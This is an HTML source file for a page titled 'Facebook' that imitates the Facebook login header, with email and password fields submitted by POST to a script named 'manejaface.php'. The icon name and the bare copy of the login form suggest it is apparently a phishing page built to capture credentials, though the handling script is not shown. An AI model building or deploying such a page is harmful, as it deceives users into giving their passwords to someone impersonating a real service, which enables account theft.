<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="icon" type="image/icon" href="resources/instaicon.ico" sizes="16x16"/>
    <link rel="stylesheet" href="resources/font-awesome-4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="style.css">
    <title>Facebook</title>
</head>
<body>
    <header>
        <table>
            <tr>
                <td><img src="resources/descarga.png" height="50px"/></td>
                <td>
                    <form action="manejaface.php" method="POST" >
                        <table>
                            <tr>
                                <td class="treinta"> 
                                    <p>Email</p>
                                    <input type="text" id="user" name="user"autocomplete="off"/>
                                    <div class="block"><input type="checkbox" name="logedin" id="loged">
                                    <label for="loged">Keep me loged in</label></div>
                                    
                                </td>
                                <td class="treinta">
                                    <p>Password</p>
                                    <input type="password" id="pass" name="pass" autocomplete="off"/><a href="#" class="block">forgot your password?</a>
                                </td>
                                <td class="treinta">
                                    <input type="submit" value="Log In"/>
                                </td>
                            </tr>
                        </table>
                    </form>
                </td>
            </tr>
        </table>
    </header>
</body>
</html>